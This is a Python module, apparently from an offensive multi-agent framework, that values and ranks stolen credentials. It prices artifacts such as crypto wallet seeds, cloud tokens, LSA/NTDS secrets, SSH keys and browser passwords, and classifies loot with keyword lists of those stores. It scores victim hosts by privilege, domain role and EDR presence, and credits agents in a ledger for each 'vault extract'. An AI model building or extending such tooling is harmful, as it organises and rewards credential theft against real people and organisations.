"""
recon/target_identity.py
========================
Unified TargetIdentity living profile, explicit ArtifactValuationTable (ROOT pricing),
and automatic Vault -> TargetIdentity -> BEL / CausalGraph feedback loop.
"""

from __future__ import annotations

import logging
import threading
import time
from dataclasses import dataclass, field, asdict
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("TargetIdentity")


# ═══════════════════════════════════════════════════════════════════════════════
# 1. ARTIFACT VALUATION TABLE (EXPLICIT ROOT PRICING)
# ═══════════════════════════════════════════════════════════════════════════════

class ArtifactType(str, Enum):
    WALLET_SEED = "wallet_seed"
    CLOUD_IAM_TOKEN = "cloud_iam_token"
    LSA_SYSTEM_SECRET = "lsa_system_secret"
    SSH_PRIVATE_KEY = "ssh_private_key"
    DB_CREDENTIAL = "db_credential"
    GIT_TOKEN = "git_token"
    BROWSER_PASSWORD = "browser_password"
    EMAIL_CREDENTIAL = "email_credential"
    GENERIC_SECRET = "generic_secret"


@dataclass(frozen=True)
class ArtifactValuationSpec:
    artifact_type: ArtifactType
    base_root_value: float
    sensitivity_tier: str          # critical | high | medium | low
    causal_action: str             # corresponding node in CausalGraph
    causal_value_signal: float     # normalized 0.0-1.0 data_value signal


DEFAULT_VALUATION_TABLE: Dict[ArtifactType, ArtifactValuationSpec] = {
    ArtifactType.WALLET_SEED: ArtifactValuationSpec(
        ArtifactType.WALLET_SEED, 250.0, "critical", "extract_crypto", 0.98
    ),
    ArtifactType.CLOUD_IAM_TOKEN: ArtifactValuationSpec(
        ArtifactType.CLOUD_IAM_TOKEN, 180.0, "critical", "extract_cloud", 0.92
    ),
    ArtifactType.LSA_SYSTEM_SECRET: ArtifactValuationSpec(
        ArtifactType.LSA_SYSTEM_SECRET, 150.0, "critical", "extract_lsa", 0.88
    ),
    ArtifactType.SSH_PRIVATE_KEY: ArtifactValuationSpec(
        ArtifactType.SSH_PRIVATE_KEY, 120.0, "high", "extract_ssh", 0.82
    ),
    ArtifactType.DB_CREDENTIAL: ArtifactValuationSpec(
        ArtifactType.DB_CREDENTIAL, 110.0, "high", "extract_db", 0.78
    ),
    ArtifactType.GIT_TOKEN: ArtifactValuationSpec(
        ArtifactType.GIT_TOKEN, 65.0, "medium", "extract_git", 0.62
    ),
    ArtifactType.BROWSER_PASSWORD: ArtifactValuationSpec(
        ArtifactType.BROWSER_PASSWORD, 45.0, "medium", "extract_chrome", 0.58
    ),
    ArtifactType.EMAIL_CREDENTIAL: ArtifactValuationSpec(
        ArtifactType.EMAIL_CREDENTIAL, 35.0, "low", "extract_email", 0.45
    ),
    ArtifactType.GENERIC_SECRET: ArtifactValuationSpec(
        ArtifactType.GENERIC_SECRET, 15.0, "low", "extract_generic", 0.30
    ),
}


class ArtifactValuationTable:
    """Explicit ROOT price table for extracted artifacts."""

    def __init__(self, specs: Optional[Dict[ArtifactType, ArtifactValuationSpec]] = None):
        self._specs: Dict[ArtifactType, ArtifactValuationSpec] = dict(
            specs or DEFAULT_VALUATION_TABLE
        )

    def get_spec(self, artifact_type: ArtifactType) -> ArtifactValuationSpec:
        return self._specs.get(artifact_type, self._specs[ArtifactType.GENERIC_SECRET])

    @staticmethod
    def classify(name: str, metadata: Optional[Dict[str, Any]] = None) -> ArtifactType:
        """Infer ArtifactType from explicit metadata or artifact name keywords."""
        if metadata:
            explicit = str(metadata.get("artifact_type", "")).lower().strip()
            for at in ArtifactType:
                if explicit == at.value:
                    return at

        lowered = name.lower()
        if any(k in lowered for k in ("wallet", "metamask", "brave_wallet", "seed", "mnemonic", "phantom", "exodus")):
            return ArtifactType.WALLET_SEED
        if any(k in lowered for k in ("aws", "gcp", "azure", "iam", "cloud", "sts_token", "kubeconfig")):
            return ArtifactType.CLOUD_IAM_TOKEN
        if any(k in lowered for k in ("lsa", "sam", "ntds", "kerberos", "tgt", "lsass", "ntlm")):
            return ArtifactType.LSA_SYSTEM_SECRET
        if any(k in lowered for k in ("ssh", "id_rsa", "id_ed25519", "authorized_keys")):
            return ArtifactType.SSH_PRIVATE_KEY
        if any(k in lowered for k in ("postgres", "mysql", "redis", "mongo", "db_cred", "dsn")):
            return ArtifactType.DB_CREDENTIAL
        if any(k in lowered for k in ("git", "github", "gitlab", "pat_token")):
            return ArtifactType.GIT_TOKEN
        if any(k in lowered for k in ("chrome", "edge", "firefox", "browser", "cookie", "password")):
            return ArtifactType.BROWSER_PASSWORD
        if any(k in lowered for k in ("email", "imap", "smtp", "outlook", "gmail")):
            return ArtifactType.EMAIL_CREDENTIAL
        return ArtifactType.GENERIC_SECRET

    def price_artifact(
        self,
        artifact_type: ArtifactType,
        identity: Optional["TargetIdentity"] = None,
    ) -> float:
        """
        Compute ROOT value of an artifact, weighted by TargetIdentity context
        (privilege level + domain role).
        """
        spec = self.get_spec(artifact_type)
        if identity is None:
            return round(spec.base_root_value, 2)

        priv_mult = _PRIVILEGE_MULTIPLIERS.get(identity.privilege_level.lower(), 1.0)
        role_mult = _DOMAIN_ROLE_MULTIPLIERS.get(identity.domain_role.lower(), 1.0)
        return round(spec.base_root_value * priv_mult * role_mult, 2)

    def as_dict(self) -> Dict[str, Dict[str, Any]]:
        return {
            at.value: {
                "base_root_value": spec.base_root_value,
                "sensitivity_tier": spec.sensitivity_tier,
                "causal_action": spec.causal_action,
            }
            for at, spec in self._specs.items()
        }


# ═══════════════════════════════════════════════════════════════════════════════
# 2. UNIFIED LIVING TARGET IDENTITY
# ═══════════════════════════════════════════════════════════════════════════════

_PRIVILEGE_MULTIPLIERS: Dict[str, float] = {
    "user": 1.0,
    "admin": 1.35,
    "system": 1.50,
    "root": 1.50,
}

_DOMAIN_ROLE_MULTIPLIERS: Dict[str, float] = {
    "unknown": 1.0,
    "workstation": 1.0,
    "member_server": 1.20,
    "cloud_vm": 1.35,
    "domain_controller": 1.60,
}


@dataclass
class TargetIdentity:
    """
    Unified living identity of a target host, merging recon signals and
    continuously updated as extracts land in BlackVault.
    """
    target_id: str
    hostname: str = ""
    os_family: str = "unknown"
    privilege_level: str = "user"
    domain_role: str = "unknown"
    edr_products: List[str] = field(default_factory=list)
    has_wallets: bool = False
    has_cloud_tokens: bool = False
    has_ssh_keys: bool = False
    has_browser_store: bool = False
    has_db_creds: bool = False
    artifact_counts: Dict[str, int] = field(default_factory=dict)
    total_extracted_root_value: float = 0.0
    weighted_priority_score: float = 0.0
    last_updated: float = field(default_factory=time.time)

    def recompute_weights(self) -> float:
        """
        Recompute unified priority score (0-100+) from privilege, domain role,
        discovered high-value stores (wallets/cloud/SSH/DB), and EDR friction.
        """
        priv_mult = _PRIVILEGE_MULTIPLIERS.get(self.privilege_level.lower(), 1.0)
        role_mult = _DOMAIN_ROLE_MULTIPLIERS.get(self.domain_role.lower(), 1.0)

        asset_bonus = 0.0
        if self.has_wallets:
            asset_bonus += 35.0
        if self.has_cloud_tokens:
            asset_bonus += 25.0
        if self.has_ssh_keys:
            asset_bonus += 15.0
        if self.has_db_creds:
            asset_bonus += 15.0
        if self.has_browser_store:
            asset_bonus += 8.0

        edr_friction = max(0.55, 1.0 - 0.12 * len(self.edr_products))
        base = 20.0 + asset_bonus + min(40.0, self.total_extracted_root_value * 0.05)
        self.weighted_priority_score = round(base * priv_mult * role_mult * edr_friction, 2)
        self.last_updated = time.time()
        return self.weighted_priority_score

    def record_extract(self, artifact_type: ArtifactType, root_value: float) -> None:
        key = artifact_type.value
        self.artifact_counts[key] = self.artifact_counts.get(key, 0) + 1
        self.total_extracted_root_value = round(self.total_extracted_root_value + root_value, 2)

        if artifact_type == ArtifactType.WALLET_SEED:
            self.has_wallets = True
        elif artifact_type == ArtifactType.CLOUD_IAM_TOKEN:
            self.has_cloud_tokens = True
        elif artifact_type == ArtifactType.SSH_PRIVATE_KEY:
            self.has_ssh_keys = True
        elif artifact_type == ArtifactType.BROWSER_PASSWORD:
            self.has_browser_store = True
        elif artifact_type == ArtifactType.DB_CREDENTIAL:
            self.has_db_creds = True

        self.recompute_weights()

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


# ═══════════════════════════════════════════════════════════════════════════════
# 3. REGISTRY + BEL & CAUSAL FEEDBACK HOOK
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class ExtractValuationEvent:
    target_id: str
    artifact_name: str
    artifact_type: str
    root_value: float
    agent_id: str
    identity_priority_after: float
    causal_action: str
    timestamp: float = field(default_factory=time.time)


class TargetIdentityRegistry:
    """
    Process-wide registry maintaining living TargetIdentity profiles,
    pricing vault extracts, and feeding value signals to BEL & CausalGraph.
    """

    _singleton: Optional["TargetIdentityRegistry"] = None
    _singleton_lock = threading.Lock()

    def __init__(
        self,
        valuation_table: Optional[ArtifactValuationTable] = None,
        causal_graph: Optional[Any] = None,
    ):
        self._lock = threading.RLock()
        self._identities: Dict[str, TargetIdentity] = {}
        self.valuation_table = valuation_table or ArtifactValuationTable()
        self.causal_graph = causal_graph
        self.reward_log: List[ExtractValuationEvent] = []

    @classmethod
    def instance(cls) -> "TargetIdentityRegistry":
        with cls._singleton_lock:
            if cls._singleton is None:
                cls._singleton = cls()
            return cls._singleton

    def attach_causal_graph(self, graph: Any) -> None:
        with self._lock:
            self.causal_graph = graph

    def get_or_create(
        self,
        target_id: str,
        hostname: str = "",
        os_family: str = "unknown",
        privilege_level: str = "user",
        domain_role: str = "unknown",
        edr_products: Optional[List[str]] = None,
    ) -> TargetIdentity:
        with self._lock:
            ident = self._identities.get(target_id)
            if ident is None:
                ident = TargetIdentity(
                    target_id=target_id,
                    hostname=hostname or target_id,
                    os_family=os_family,
                    privilege_level=privilege_level,
                    domain_role=domain_role,
                    edr_products=list(edr_products or []),
                )
                ident.recompute_weights()
                self._identities[target_id] = ident
            else:
                if hostname:
                    ident.hostname = hostname
                if os_family != "unknown":
                    ident.os_family = os_family
                if privilege_level != "user":
                    ident.privilege_level = privilege_level
                if domain_role != "unknown":
                    ident.domain_role = domain_role
                if edr_products:
                    for prod in edr_products:
                        if prod not in ident.edr_products:
                            ident.edr_products.append(prod)
                ident.recompute_weights()
            return ident

    def get(self, target_id: str) -> Optional[TargetIdentity]:
        with self._lock:
            return self._identities.get(target_id)

    def ingest_extract(
        self,
        target_id: str,
        artifact_name: str,
        metadata: Optional[Dict[str, Any]] = None,
        agent_id: str = "unknown_agent",
    ) -> ExtractValuationEvent:
        """
        Classify & price an extracted artifact, update the target's living
        TargetIdentity, and push a causal data_value update if a graph is attached.
        """
        meta = metadata or {}
        with self._lock:
            ident = self.get_or_create(
                target_id=target_id,
                hostname=str(meta.get("hostname", "")),
                os_family=str(meta.get("os_family", "unknown")),
                privilege_level=str(meta.get("privilege_level", "user")),
                domain_role=str(meta.get("domain_role", "unknown")),
                edr_products=meta.get("edr_products"),
            )
            artifact_type = self.valuation_table.classify(artifact_name, meta)
            spec = self.valuation_table.get_spec(artifact_type)
            root_value = self.valuation_table.price_artifact(artifact_type, ident)

            ident.record_extract(artifact_type, root_value)
            self._update_causal_prior(spec)

            evt = ExtractValuationEvent(
                target_id=target_id,
                artifact_name=artifact_name,
                artifact_type=artifact_type.value,
                root_value=root_value,
                agent_id=agent_id,
                identity_priority_after=ident.weighted_priority_score,
                causal_action=spec.causal_action,
            )
            self.reward_log.append(evt)
            logger.info(
                "[TargetIdentity] %s <- %s (%s) priced at %.2f ROOT | priority=%.2f",
                target_id,
                artifact_name,
                artifact_type.value,
                root_value,
                ident.weighted_priority_score,
            )
            return evt

    async def ingest_and_credit_bel(
        self,
        ledger: Any,
        target_id: str,
        artifact_name: str,
        metadata: Optional[Dict[str, Any]] = None,
        agent_id: str = "unknown_agent",
    ) -> ExtractValuationEvent:
        """Ingest extract, update TargetIdentity + CausalGraph, and credit BEL Ledger."""
        evt = self.ingest_extract(
            target_id=target_id,
            artifact_name=artifact_name,
            metadata=metadata,
            agent_id=agent_id,
        )
        if ledger is not None and evt.root_value > 0:
            await ledger.credit(
                agent_id,
                evt.root_value,
                f"vault_extract:{evt.artifact_type}:{evt.target_id}",
            )
        return evt

    def _update_causal_prior(self, spec: ArtifactValuationSpec) -> None:
        if self.causal_graph is None:
            return
        try:
            effects = self.causal_graph.query_effects(spec.causal_action)
            if "data_value" in effects:
                old_w = float(effects["data_value"])
                # Smooth EMA blend so observed high-value extracts shift priors upward
                new_w = round(0.75 * old_w + 0.25 * spec.causal_value_signal, 4)
                self.causal_graph.update_edge(
                    spec.causal_action, "data_value", new_weight=new_w
                )
        except Exception as exc:
            logger.debug("[TargetIdentity] CausalGraph update skipped: %s", exc)

    def ranked_targets(self) -> List[TargetIdentity]:
        with self._lock:
            return sorted(
                self._identities.values(),
                key=lambda t: t.weighted_priority_score,
                reverse=True,
            )
